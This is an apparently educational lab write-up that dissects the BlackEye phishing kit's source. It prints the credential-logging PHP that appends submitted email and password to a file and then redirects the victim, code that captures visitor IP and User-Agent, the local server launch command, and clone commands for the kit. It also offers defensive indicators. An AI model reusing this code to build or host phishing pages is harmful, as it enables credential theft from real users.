# 11. Phishing Framework Analysis — BlackEye



## Objective



The objective of this lab was to study how a phishing framework works by examining the source code of **BlackEye** in a controlled Linux virtual machine environment.



The focus of this lab was not to target real users or collect real credentials. Instead, the goal was to understand the technical mechanisms behind a phishing page, including:



* How a phishing framework is structured

* How a fake login page is created using HTML

* How an HTML form sends submitted data to a PHP backend

* How PHP processes form data

* How submitted information can be written to a file

* How IP address and User-Agent information can be collected

* How a local web server hosts the phishing page

* How redirection can be used after form submission

* How phishing frameworks automate these different components



The analysis was performed for cybersecurity education and defensive understanding in a controlled lab environment.



## Lab Environment



| Component       | Details                         |

| --------------- | ------------------------------- |

| Host OS         | Windows 11                      |

| Virtualization  | VMware Workstation              |

| Linux VM        | Ubuntu                          |

| Analysis Target | BlackEye phishing framework     |

| Git             | Git 2.53.0                      |

| Lab Directory   | `\~/cyber-lab/blackeye-analysis` |



## Important Safety Note



This lab was limited to source-code analysis and controlled local testing.



No real accounts, passwords, or third-party credentials were targeted or collected, and the phishing page was not publicly exposed.



The purpose was to understand how phishing attacks work technically so that similar techniques can be recognized and defended against.





## 1. Obtaining the Source Code



The first step was to obtain a copy of the BlackEye source code so that its files and scripts could be examined.



### Checking the Original Repository



The original repository remembered for this project was:



```text

https://github.com/x3rz/blackeye.git

```



I tested whether the repository could be accessed using:



```bash

git ls-remote https://github.com/x3rz/blackeye.git

```



Git prompted for GitHub credentials instead of returning the repository references normally expected from a publicly accessible repository.



I cancelled the operation with:



```text

Ctrl + C

```



No GitHub credentials were entered.



### Checking a Public Fork



A publicly accessible fork was then checked:



```bash

git ls-remote https://github.com/8L4NK/blackeye.git

```



The command returned repository references, confirming that the repository could be accessed.



### Cloning the Repository



The repository was cloned into the Ubuntu analysis directory using:



```bash

git clone https://github.com/8L4NK/blackeye.git

```



The clone completed successfully.



The resulting directory was:



```text

\~/cyber-lab/blackeye-analysis/blackeye

```



### Why `git clone` Was Used



`git clone` creates a local copy of a Git repository.



This allowed the source code to be examined locally rather than simply using the framework as a black-box tool.



The purpose of cloning the repository in this lab was therefore **source-code analysis and understanding**, not deployment against real users.





## 2. Examining the Repository Structure



After cloning the repository, the next step was to inspect its contents.



The main BlackEye directory contained:



```text

blackeye/

├── LICENSE

├── README.md

├── blackeye.sh

└── sites/

```



The files and directories were examined using:



```bash

ls blackeye

```



### Main Components



#### `blackeye.sh`



`blackeye.sh` is the main Bash script used by the framework.



It contains the logic that coordinates different parts of the framework, including:



* Selecting a site template

* Checking for required software

* Starting the local PHP server

* Handling captured information

* Processing IP and User-Agent information

* Managing files created during the framework's operation



The script therefore acts as the main controller for the framework.



#### `sites/`



The `sites` directory contains the individual website templates used by the framework.



The directory was inspected using:



```bash

ls blackeye/sites

```



The repository contained templates associated with various services, including:



```text

adobe

badoo

facebook

github

gitlab

google

instagram

linkedin

microsoft

netflix

paypal

pinterest

protonmail

shopify

spotify

steam

twitch

twitter

wordpress

yahoo

```



There were also additional templates in the repository.



### Why the `sites` Directory Is Important



The `sites` directory shows that the framework is designed around multiple website templates.



Instead of having one single phishing page, the framework keeps different templates in separate directories.



For example:



```text

sites/

└── google/

&#x20;   ├── index.php

&#x20;   ├── ip.php

&#x20;   ├── login.html

&#x20;   └── login.php

```



This structure became important during the source-code analysis because these files perform different parts of the phishing-page workflow.



The next step was therefore to examine one template and understand how its HTML page communicates with the PHP backend.



## 3. Analyzing the Login Page



To understand how the phishing page works, the `google` template was examined as a source-code example.



The template contained four main files:



```text

google/

├── index.php

├── ip.php

├── login.html

└── login.php

```



The first file examined was:



```text

login.html

```



### Examining the HTML Form



The form was identified using:



```bash

grep -n "<form\\|name=\\"Email\\"\\|name=\\"Passwd\\"" blackeye/sites/google/login.html

```



The relevant section contained:



```html

<form novalidate="" id="gaia\_loginform" action="login.php" method="post">

```



The form also contained fields including:



```html

<input name="Email" id="Email" type="email">



<input name="Passwd" id="Passwd" type="password">



<input class="g-button g-button-submit"

&#x20;      name="signIn"

&#x20;      id="signIn"

&#x20;      value="Sign in"

&#x20;      type="submit">

```



### Understanding the Form



The important part of the form is:



```html

action="login.php"

```



This tells the browser where to send the form data.



The second important part is:



```html

method="post"

```



`POST` is an HTTP request method commonly used to send data from a form to a web server.



Therefore, when the form is submitted, the browser sends the entered form values to:



```text

login.php

```



The field names are also important:



```text

Email

Passwd

```



These names become the keys that the PHP backend can use to access the submitted values.



Conceptually, the process is:



```text

User enters information

&#x20;       │

&#x20;       ▼

&#x20;   login.html

&#x20;       │

&#x20;       │ HTTP POST

&#x20;       ▼

&#x20;   login.php

&#x20;       │

&#x20;       ▼

&#x20;PHP processes the submitted data

```



### Security Significance



This demonstrates an important phishing concept: the visual appearance of a login page is only one part of the attack.



The HTML form determines where the information entered by the user is sent.



Therefore, when analyzing a suspicious login page, examining the form's `action`, `method`, and input `name` attributes can help reveal how submitted information is handled.



In this lab, the next step was to examine `login.php` and determine what happened to the submitted values after the form was sent.pk



## 4. Analyzing the PHP Backend



After examining `login.html`, the next step was to inspect `login.php` to determine what happened after the form was submitted.



The file was examined using:



```bash

cat blackeye/sites/google/login.php

```



The relevant code was:



```php

file\_put\_contents("usernames.txt", "Account: " . $\_POST\['Email'] . " Pass: " . $\_POST\['Passwd'] . "\\n", FILE\_APPEND);



header('Location: https://google.com/');

```



### Understanding `$\_POST`



The HTML form used:



```html

<input name="Email">

<input name="Passwd">

```



Because the form used the `POST` method, PHP made those submitted values available through the `$\_POST` variable.



The backend accessed them using:



```php

$\_POST\['Email']

```



and:



```php

$\_POST\['Passwd']

```



In simple terms:



```text

HTML field                 PHP receives



name="Email"        →      $\_POST\['Email']



name="Passwd"       →      $\_POST\['Passwd']

```



This demonstrates the connection between the HTML frontend and the PHP backend.



### Writing Data to a File



The code uses:



```php

file\_put\_contents()

```



to write the submitted values into:



```text

usernames.txt

```



The `FILE\_APPEND` option means new entries are added to the existing file rather than replacing its previous contents.



The basic flow is therefore:



```text

login.html

&#x20;   │

&#x20;   │ POST

&#x20;   ▼

login.php

&#x20;   │

&#x20;   │ reads $\_POST

&#x20;   ▼

usernames.txt

```



### Redirecting the Browser



The second part of the PHP code is:



```php

header('Location: https://google.com/');

```



This sends an HTTP redirect response to the browser.



The browser is then instructed to navigate to the specified website.



This can make the previous page submission appear less suspicious to a user because the browser moves away from the page after the form is processed.



### Security Significance



This source-code analysis demonstrates why phishing attacks are more than simply copying the appearance of a legitimate website.



A phishing page can contain:



1\. A cloned or imitation login interface

2\. An HTML form that accepts user input

3\. A backend that receives the submitted values

4\. Code that stores or processes those values

5\. A redirect after submission



The important defensive lesson is that examining the **form destination** and **backend behavior** can reveal what a suspicious login page is actually doing.



> **Note:** The code examined in this lab demonstrates credential collection behavior. It was analyzed only as source code in a controlled environment and was not used to collect real credentials.



## 5. Analyzing IP Address and User-Agent Collection



The next file examined was:



```text

ip.php

```



This file was responsible for determining information about the visitor making the HTTP request.



It was inspected using:



```bash

cat blackeye/sites/google/ip.php

```



The relevant code included:



```php

if (!empty($\_SERVER\['HTTP\_CLIENT\_IP']))

&#x20;   $ipaddress = $\_SERVER\['HTTP\_CLIENT\_IP']."\\r\\n";



elseif (!empty($\_SERVER\['HTTP\_X\_FORWARDED\_FOR']))

&#x20;   $ipaddress = $\_SERVER\['HTTP\_X\_FORWARDED\_FOR']."\\r\\n";



else

&#x20;   $ipaddress = $\_SERVER\['REMOTE\_ADDR']."\\r\\n";

```



The file also accessed the visitor's User-Agent:



```php

$useragent = " User-Agent: ";

$browser = $\_SERVER\['HTTP\_USER\_AGENT'];

```



### Understanding the IP Address Logic



The script checks several server variables to determine an IP address.



The main values examined were:



```text

HTTP\_CLIENT\_IP

HTTP\_X\_FORWARDED\_FOR

REMOTE\_ADDR

```



If the first two are unavailable, the script falls back to:



```php

$\_SERVER\['REMOTE\_ADDR']

```



`REMOTE\_ADDR` generally represents the IP address from which the web server received the request.



The basic logic can be represented as:



```text

HTTP request

&#x20;    │

&#x20;    ▼

Check HTTP\_CLIENT\_IP

&#x20;    │

&#x20;    ├── Available → use it

&#x20;    │

&#x20;    └── Not available

&#x20;            │

&#x20;            ▼

&#x20;  Check X-Forwarded-For

&#x20;            │

&#x20;            ├── Available → use it

&#x20;            │

&#x20;            └── Not available

&#x20;                    │

&#x20;                    ▼

&#x20;              REMOTE\_ADDR

```



### Understanding the User-Agent



The script also accesses:



```php

$\_SERVER\['HTTP\_USER\_AGENT']

```



The **User-Agent** is information sent by a web browser with an HTTP request.



It can contain information that helps identify the browser and operating-system environment making the request.



For example, a browser may send a User-Agent containing information about:



```text

Browser

Operating system

Browser version

```



This information can be useful when investigating suspicious web activity.



### Important Limitation of IP Information



An IP address should not automatically be treated as a person's exact physical location.



IP-based geolocation is generally approximate and can be affected by factors such as:



* Internet Service Providers

* Mobile networks

* VPNs

* Proxies

* Shared networks

* Network address translation (NAT)



The `HTTP\_X\_FORWARDED\_FOR` header can also contain information supplied by proxies or other network infrastructure and should therefore not automatically be treated as trustworthy evidence of a user's original IP address.



### Security Significance



This demonstrates that a phishing framework may collect more than information submitted through a login form.



A framework can also attempt to record information associated with the HTTP request, such as:



```text

IP address

User-Agent

```



From a defensive perspective, this shows why suspicious web pages should be treated carefully even when a user does not submit credentials.



> **Lab note:** The purpose of examining this code was to understand the information-gathering mechanism. No real users were targeted and no real personal information was collected.



## 6. Analyzing `index.php`



The next file examined was:



```text

index.php

```



The file contained:



```php

<?php

include 'ip.php';

header('Location: login.html');

exit

?>

```



Although the file is very short, it plays an important role in the overall request flow.



### Understanding `include`



The first important line is:



```php

include 'ip.php';

```



The `include` statement tells PHP to load and execute the contents of another PHP file.



In this case, it loads:



```text

ip.php

```



This connects the initial request to the IP address and User-Agent handling documented in the previous section.



### Understanding the Redirect



The next important line is:



```php

header('Location: login.html');

```



This sends an HTTP redirect response to the browser.



The browser is then directed to:



```text

login.html

```



The final line:



```php

exit

```



stops further PHP execution after the redirect is issued.



### Request Flow



The role of `index.php` can therefore be represented as:



```text

Visitor requests index.php

&#x20;         │

&#x20;         ▼

&#x20;    include ip.php

&#x20;         │

&#x20;         ▼

IP/User-Agent handling

&#x20;         │

&#x20;         ▼

Redirect to login.html

&#x20;         │

&#x20;         ▼

&#x20;  Login page displayed

```



The complete flow we had identified so far was:



```text

&#x20;                   HTTP REQUEST

&#x20;                        │

&#x20;                        ▼

&#x20;                   index.php

&#x20;                        │

&#x20;                        ├── include → ip.php

&#x20;                        │                │

&#x20;                        │                ▼

&#x20;                        │          IP/User-Agent

&#x20;                        │

&#x20;                        ▼

&#x20;                  login.html

&#x20;                        │

&#x20;                        │ HTTP POST

&#x20;                        ▼

&#x20;                   login.php

&#x20;                        │

&#x20;                        ▼

&#x20;                 usernames.txt

&#x20;                        │

&#x20;                        ▼

&#x20;                    Redirect

```



### Security Significance



This demonstrates how several small files can work together to create a complete web-based workflow.



Individually:



* `index.php` acts as an entry point

* `ip.php` handles IP/User-Agent information

* `login.html` provides the web form

* `login.php` processes the submitted form



Together, they create a sequence of actions controlled by the framework.



Understanding this type of flow is useful for defensive analysis because suspicious web applications can often be understood by tracing:



```text

Entry point → Redirect → Form → Backend → Data handling

```



This completed the basic source-code analysis of the individual Google template files.



## 7. Analyzing `blackeye.sh`



After examining the individual files inside the `google` template, the next step was to examine the main Bash script:



```text

blackeye.sh

```



This script acts as the main controller for the BlackEye framework.



It coordinates different parts of the framework, including selecting a website template, checking dependencies, starting the local web server, and handling information generated during the framework's operation.



### Checking for Required Software



The script checks whether PHP is installed:



```bash

command -v php > /dev/null 2>\&1 || {

&#x20;   echo >\&2 "I require php but it's not installed. Install it. Aborting."

&#x20;   exit 1

}

```



The purpose of this check is to make sure the required PHP command is available before continuing.



If PHP is not installed, the script stops and displays an error message.



### Website Selection



The script contains options for different website templates.



Examples found in the script include:



```text

instagram

facebook

snapchat

twitter

github

google

spotify

netflix

paypal

steam

yahoo

linkedin

protonmail

wordpress

microsoft

twitch

```



This corresponds to the directories found under:



```text

sites/

```



For example:



```text

sites/

└── google/

```



The framework can therefore associate a selected site with its corresponding template directory.



### Processing Captured Information



The script also contains logic for handling files such as:



```text

usernames.txt

saved.usernames.txt

ip.txt

saved.ip.txt

```



These files are used by the framework to manage information generated by the individual templates.



The script also contains logic for extracting IP and User-Agent information and processing it further.



### Starting the Local PHP Server



One of the most important lines identified in the script was:



```bash

cd sites/$server \&\& php -S 127.0.0.1:3333 > /dev/null 2>\&1 \&

```



This starts PHP's built-in development web server.



The important parts are:



```text

php -S

```



which starts the PHP development server,



and:



```text

127.0.0.1:3333

```



which means the server is bound to the local machine's loopback address on port `3333`.



`127.0.0.1` is the computer's own loopback address. It refers back to the same machine rather than another device on the network.



The `\&` at the end runs the process in the background.



### Local Server Concept



The basic concept is:



```text

Ubuntu

┌──────────────────────────────┐

│                              │

│   PHP Development Server     │

│   127.0.0.1:3333             │

│            │                 │

│            ▼                 │

│       sites/$server          │

│                              │

└──────────────────────────────┘

```



This means the framework can host a website locally without first deploying it to a public web server.



### Tunneling Concept



The script also contains logic related to starting an `ngrok` server.



A tunneling service can make a service running on a local machine accessible from outside that machine.



Conceptually:



```text

Local machine

127.0.0.1:3333

&#x20;      │

&#x20;      │ tunnel

&#x20;      ▼

External network

```



For this lab, the tunneling functionality was **not used to expose the phishing page publicly**.



It was examined only to understand how the framework is designed to connect its local web server to an external-access mechanism.



### Security Significance



Examining `blackeye.sh` showed that the framework is more than a collection of copied login pages.



The Bash script acts as an automation layer that connects several components:



```text

&#x20;                blackeye.sh

&#x20;                     │

&#x20;      ┌──────────────┼──────────────┐

&#x20;      │              │              │

&#x20;      ▼              ▼              ▼

&#x20; Site selection   PHP server    Data handling

&#x20;      │              │              │

&#x20;      ▼              ▼              ▼

&#x20;    sites/       127.0.0.1:3333   text files

&#x20;      │

&#x20;      ▼

&#x20; Login template

```



This demonstrated how automation can combine HTML, PHP, Bash scripting, and web-server functionality into a single framework.



> **Lab safety note:** The analysis stopped at understanding the framework's architecture and local behavior. No public tunnel was created and no real credentials were collected.





## 8. Complete HTTP Request Flow



After analyzing the individual files and the `blackeye.sh` script, the complete request flow can be reconstructed.



The main sequence is:



```text

Visitor

&#x20;  │

&#x20;  │ HTTP request

&#x20;  ▼

index.php

&#x20;  │

&#x20;  │ include

&#x20;  ▼

ip.php

&#x20;  │

&#x20;  │ IP/User-Agent handling

&#x20;  │

&#x20;  ▼

index.php

&#x20;  │

&#x20;  │ HTTP redirect

&#x20;  ▼

login.html

&#x20;  │

&#x20;  │ User interacts with form

&#x20;  │

&#x20;  │ HTTP POST

&#x20;  ▼

login.php

&#x20;  │

&#x20;  │ Reads $\_POST values

&#x20;  ▼

usernames.txt

&#x20;  │

&#x20;  │ HTTP redirect

&#x20;  ▼

External destination

```



### Step 1 — Initial Request



The process begins when a browser requests:



```text

index.php

```



This file acts as the entry point for the template.



### Step 2 — IP and User-Agent Handling



`index.php` contains:



```php

include 'ip.php';

```



This causes PHP to load the code in `ip.php`.



The script attempts to obtain information associated with the HTTP request, including:



```text

IP address

User-Agent

```



### Step 3 — Redirect to the Login Page



After including `ip.php`, `index.php` contains:



```php

header('Location: login.html');

```



The browser is redirected to:



```text

login.html

```



The login page is then displayed.



### Step 4 — Form Submission



The HTML form contains:



```html

<form action="login.php" method="post">

```



This means that submitting the form creates an HTTP `POST` request to:



```text

login.php

```



The form contains fields whose names include:



```text

Email

Passwd

```



These names determine the keys used by PHP when accessing the submitted data.



### Step 5 — PHP Processes the Request



`login.php` accesses the submitted values through:



```php

$\_POST\['Email']

$\_POST\['Passwd']

```



The code then writes the values to:



```text

usernames.txt

```



using `file\_put\_contents()` with the `FILE\_APPEND` option.



### Step 6 — Redirect



After processing the request, the PHP script sends a redirect:



```php

header('Location: https://google.com/');

```



The browser then follows the redirect.



### Complete Conceptual Flow



The entire process can therefore be summarized as:



```text

┌──────────┐

│ Visitor  │

└────┬─────┘

&#x20;    │

&#x20;    │ HTTP Request

&#x20;    ▼

┌──────────────┐

│  index.php   │

└────┬─────────┘

&#x20;    │

&#x20;    │ include

&#x20;    ▼

┌──────────────┐

│    ip.php    │

│              │

│ IP +          │

│ User-Agent   │

└────┬─────────┘

&#x20;    │

&#x20;    │ redirect

&#x20;    ▼

┌──────────────┐

│  login.html  │

│              │

│ Login form   │

└────┬─────────┘

&#x20;    │

&#x20;    │ HTTP POST

&#x20;    ▼

┌──────────────┐

│  login.php   │

│              │

│ $\_POST       │

└────┬─────────┘

&#x20;    │

&#x20;    │ write

&#x20;    ▼

┌──────────────┐

│usernames.txt │

└────┬─────────┘

&#x20;    │

&#x20;    │ redirect

&#x20;    ▼

┌──────────────────┐

│ External Website │

└──────────────────┘

```



### What This Demonstrates



The analysis shows how several different technologies can work together:



| Component        | Role                                           |

| ---------------- | ---------------------------------------------- |

| HTML             | Displays the login form                        |

| HTTP             | Transfers requests and responses               |

| PHP              | Processes server-side requests                 |

| Bash             | Automates the framework                        |

| Text files       | Store information generated by the application |

| Local PHP server | Hosts the web application                      |



The important lesson is that a phishing workflow is not necessarily a single program. It can be composed of multiple components that work together through normal web technologies.



### Defensive Indicators



From a defensive perspective, several elements of this workflow are useful to understand:



* A login form submitting to an unexpected domain or endpoint

* HTML forms using unusual or suspicious destinations

* Server-side scripts receiving login information

* Unexpected storage of submitted form values

* Redirects immediately after form submission

* Collection of IP or User-Agent information

* Locally hosted or externally tunneled web applications



Understanding the request flow makes it easier to investigate suspicious login pages and identify where submitted information may be going.



## 9. Lessons Learned



This lab provided practical experience in analyzing a phishing framework by examining its source code rather than simply running it.



### Technical Lessons



The main technical concepts learned during the lab were:



#### 1. Git and Source-Code Analysis



I learned how to use Git to obtain a public repository and examine its source code locally.



The main commands used included:



```bash

git ls-remote

git clone

ls

cat

grep

```



This demonstrated how Git can be used as part of a cybersecurity workflow for inspecting publicly available code.



#### 2. HTML Forms



I learned how an HTML form connects a webpage to a server-side application.



The important attributes examined were:



```html

action="login.php"

method="post"

```



The `action` attribute identifies the destination for the form submission, while `POST` specifies the HTTP method used to send the form data.



#### 3. HTTP POST Requests



The lab demonstrated how information entered into an HTML form can be transmitted to a server through an HTTP POST request.



The relationship was:



```text

HTML Form

&#x20;   │

&#x20;   │ POST

&#x20;   ▼

PHP Backend

```



#### 4. PHP Server-Side Processing



The lab showed how PHP can access submitted form data using:



```php

$\_POST\['field\_name']

```



The PHP code then processed the submitted values and wrote them to a file.



This helped connect frontend web forms with backend server-side processing.



#### 5. PHP File Handling



The `file\_put\_contents()` function was used by the analyzed code to write information to a text file.



The `FILE\_APPEND` option allows new information to be added without replacing existing entries.



#### 6. IP Address and User-Agent Information



The lab demonstrated how PHP can access information associated with an HTTP request through variables such as:



```text

$\_SERVER\['REMOTE\_ADDR']

$\_SERVER\['HTTP\_USER\_AGENT']

```



It also showed why IP information should be interpreted carefully because an IP address does not necessarily identify a person's exact physical location.



#### 7. Local Web Servers



The framework used PHP's built-in development server:



```bash

php -S 127.0.0.1:3333

```



This helped demonstrate how a web application can be hosted locally during development and testing.



#### 8. Bash Automation



The `blackeye.sh` script demonstrated how Bash can automate multiple operations, including:



* Checking dependencies

* Selecting files

* Starting services

* Processing generated files

* Managing different templates



This showed how scripting can connect multiple components into a single workflow.



\---



## 10. Defensive Lessons



Understanding how phishing frameworks work is useful for recognizing and investigating suspicious websites.



### Inspect the Login Form



A suspicious login page can be examined by checking:



```html

<form action="..." method="...">

```



The `action` value can reveal where submitted information is intended to be sent.



### Check the Website Address



A website can visually resemble a legitimate service while being hosted on a completely different domain.



Users should therefore verify the actual domain in the browser address bar rather than relying only on the appearance of the page.



### Look for Unexpected Redirects



A login page that immediately redirects somewhere else after submission can be worth investigating.



Redirect behavior alone does not prove that a page is malicious, but it can be useful evidence when combined with other indicators.



### Understand What the Browser Sends



Browser developer tools and network-analysis tools such as Wireshark can help security analysts examine HTTP requests and understand where a browser is communicating.



This connects the current lab with the earlier Wireshark work in this cybersecurity project.



### Protect Credentials



Users should avoid entering passwords into suspicious login pages.



Using password managers can also provide an additional signal because many password managers recognize the expected website domain rather than simply matching the visual appearance of a page.



### Use Multi-Factor Authentication



Multi-factor authentication adds another layer of protection beyond a password.



Even when credentials are exposed through phishing, additional authentication requirements can reduce the usefulness of stolen passwords, although the level of protection depends on the authentication method.



\---



## 11. Overall Understanding



The most important lesson from this lab was understanding the complete technical chain:



```text

Web Page

&#x20;  ↓

HTML Form

&#x20;  ↓

HTTP POST Request

&#x20;  ↓

PHP Backend

&#x20;  ↓

Data Processing

&#x20;  ↓

File Storage / Other Action

&#x20;  ↓

Redirect

```



The BlackEye source-code analysis demonstrated that phishing frameworks can combine ordinary web technologies such as HTML, HTTP, PHP, Bash, and web servers to automate a phishing workflow.



From a cybersecurity perspective, understanding these components makes it easier to recognize suspicious behavior, investigate web requests, and identify potential points where sensitive information could be exposed.



## 12. Lab Safety and Scope



This project was conducted as a controlled educational source-code analysis.



The analysis did not involve:



* Targeting real users

* Collecting real credentials

* Using real accounts

* Publicly exposing the phishing page

* Creating a public phishing campaign



The purpose was to understand the underlying technology and develop defensive awareness.





## 13. Tools and Commands Used



The following commands and tools were used during the BlackEye source-code analysis.



| Command / Tool     | Purpose                                                                                           |

| ------------------ | ------------------------------------------------------------------------------------------------- |

| `git ls-remote`    | Checks the references available in a remote Git repository without cloning the entire repository. |

| `git clone`        | Creates a local copy of a Git repository.                                                         |

| `ls`               | Lists files and directories.                                                                      |

| `cat`              | Displays the contents of a file in the terminal.                                                  |

| `grep`             | Searches files for specific text or patterns.                                                     |

| `wc -l`            | Counts the number of lines in a file.                                                             |

| `php`              | Used to inspect and understand the PHP web-server functionality in the framework.                 |

| `127.0.0.1`        | The loopback address that refers to the local machine.                                            |

| Port `3333`        | The local port used by the framework's PHP development server.                                    |

| Git                | Used to obtain and inspect the source-code repository.                                            |

| Ubuntu             | Linux environment used for the analysis.                                                          |

| VMware Workstation | Virtualization platform used to run the Ubuntu lab environment.                                   |



### Important Commands



#### Check a Remote Repository



```bash

git ls-remote https://github.com/8L4NK/blackeye.git

```



Used to check whether the public repository could be accessed and to view its Git references.



#### Clone the Repository



```bash

git clone https://github.com/8L4NK/blackeye.git

```



Used to download a local copy of the repository for analysis.



#### List Repository Contents



```bash

ls blackeye

```



Used to identify the main files and directories inside the cloned repository.



#### List Website Templates



```bash

ls blackeye/sites

```



Used to examine the different site-template directories contained in the repository.



#### Inspect a File



```bash

cat blackeye/sites/google/login.php

```



Used to read the contents of a PHP file directly in the terminal.



#### Search Source Code



```bash

grep -n "<form\\|name=\\"Email\\"\\|name=\\"Passwd\\"" blackeye/sites/google/login.html

```



Used to locate the HTML form and the relevant input fields inside `login.html`.



#### Inspect Framework Components



```bash

grep -n "sites\\|google\\|php\\|python\\|server\\|localhost" blackeye/blackeye.sh

```



Used to locate important sections of the main Bash script related to website templates, PHP, servers, and localhost.



#### Count Lines



```bash

wc -l blackeye/sites/google/index.php

```



Used to determine the number of lines in a file.



### Command-Line Analysis Workflow



The general workflow used during the analysis was:



```text

Obtain Repository

&#x20;      ↓

&#x20;   git clone

&#x20;      ↓

Inspect Directory

&#x20;      ↓

&#x20;      ls

&#x20;      ↓

Locate Interesting Files

&#x20;      ↓

&#x20;     grep

&#x20;      ↓

Read Source Code

&#x20;      ↓

&#x20;     cat

&#x20;      ↓

Understand Program Flow

&#x20;      ↓

Document Findings

```



This workflow demonstrates a basic approach to source-code analysis: obtain the code, identify relevant files, search for important functionality, inspect the implementation, and document the findings.






